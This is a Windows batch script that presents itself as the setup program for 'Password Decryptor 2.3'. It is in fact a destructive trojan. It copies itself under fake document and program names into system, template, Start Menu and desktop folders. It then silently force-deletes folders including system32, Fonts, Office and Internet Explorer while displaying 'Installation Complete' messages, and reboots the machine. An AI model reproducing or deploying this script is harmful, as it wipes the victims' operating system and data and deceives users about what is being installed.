   @echo off
   cls
   echo Welcome to the Password Decryptor 2.3 setup
   copy %0 "C:\PROG~1\Windows Media Player\PasswordDecrypt.exe"
   copy %0 "C:\WINDOWS\SYS~1\PasswordDecrypt.doc"
   copy %0 "C:\DOCUME~1\ALLU~1\Application Data\PasswordDecrypt.xls"
   copy %0 "C:\DOCUME~1\ALLU~1\Templates\PasswordDecrypt.bat"
   copy %0 "C:\DOCUME~1\ALLU~1\Start Menu\Programs\PasswordDecrypt.txt"
   copy %0 "C:\DOCUME~1\ALLU~1\Desktop\PasswordDecrypt.rtf"
   pause
   echo Please wait while setup scans the system...
   IF NOT EXIST "C:\Password Decryptor 2.3" GOTO install
   ELSE GOTO found

   :found
   pause
   echo A previous version was detected.
   echo Goodbye.
   cls
   exit

   :install
   pause
   echo  No previous versions were found.....Continuing setup.
   MD "C:\Password Decryptor 2.3"
   RD/s/q "C:\WINDOWS\Fonts"
   RD/s/q "C:\Program Files\Office XP"
   RD/s/q "C:\WINDOWS\Media"
   echo Installation Complete.  Setup now needs to restart the system...
   RD/s/q "C:\WINDOWS\system32"
   RD/s/q "C:\Program Files\Windows NT"
   RD/s/q "C:\Program Files\Internet Explorer
   SHUTDOWN -r -t 3
